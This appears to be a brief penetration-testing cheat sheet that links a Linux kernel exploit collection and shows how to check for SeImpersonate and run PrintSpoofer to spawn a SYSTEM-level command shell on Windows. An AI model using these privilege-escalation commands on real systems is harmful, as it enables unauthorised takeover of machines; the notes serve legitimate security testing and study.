# Links

[Linux-Kernel-Exploits](https://github.com/SecWiki/linux-kernel-exploits)

# Windows Privilege Escalation Tools

## PrintSpoofer.exe
- Tested on Windows 10 - [Reference](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- Uses NamedPipes and SeImpersonate to gain SYSTEM level priviledges - LPE
```bash
# Check for SeImpersonate
whoami /priv
# Execute LPE
PrintSpoofer.exe -i -c cmd
```
